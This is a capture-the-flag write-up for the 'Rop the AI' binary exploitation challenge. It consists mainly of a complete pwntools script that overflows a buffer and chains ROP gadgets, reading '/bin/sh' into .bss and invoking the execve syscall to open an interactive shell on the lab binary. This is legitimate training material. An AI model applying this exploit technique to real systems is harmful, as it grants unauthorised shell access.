# [Easy] Rop the AI (100 points)

> We managed to take back this configuration manager from the AI. However, we are unsure if the AI has tinkered with it somehow. Can you help us discover any vulnerabilities in the program and, if you find any, exploit them as proof of your work?
>
> Author information: This challenge is developed by [MdeVries@DeloitteNL](https://portal.hackazon.org/).

> Can you find and exploit the vulnerability?

```py
from pwn import *

def start(argv = [], *a, **kw):
  if args.GDB:
    return gdb.debug([exe] + argv, gdbscript = gdbscript, *a, **kw)
  elif args.REMOTE:
    return remote(sys.argv[1], sys.argv[2], *a, **kw)
  else:
    return process([exe] + argv, *a, **kw)

gdbscript = '''
break *vuln
init-pwndbg
continue
'''.format(**locals())

exe = './ROP-the-AI'
elf = context.binary = ELF(exe, checksec = False)
rop = ROP(elf)
context.log_level = 'info'

io = start()

ret = rop.find_gadget(['ret'])[0]
pop_rdi_ret = rop.find_gadget(['pop rdi', 'ret'])[0]
pop_rax_ret = rop.find_gadget(['pop rax', 'ret'])[0]
pop_rsi_pop_r15_ret = rop.find_gadget(['pop rsi', 'pop r15', 'ret'])[0]
pop_rdx_ret = rop.find_gadget(['pop rdx', 'ret'])[0]
syscall_ret = rop.find_gadget(['syscall', 'ret'])[0]

payload = flat([
  b'A' * 120,
  ret,
  pop_rdi_ret,
  elf.bss(),
  elf.symbols['gets'],
  pop_rax_ret,
  0x3b,
  pop_rdi_ret,
  elf.bss(),
  pop_rsi_pop_r15_ret,
  0,
  b'pwnisfun',
  pop_rdx_ret,
  0,
  syscall_ret
])

print(io.recv().decode())
io.sendline(payload)
io.sendline(b'/bin/sh\x00')

io.interactive()
```
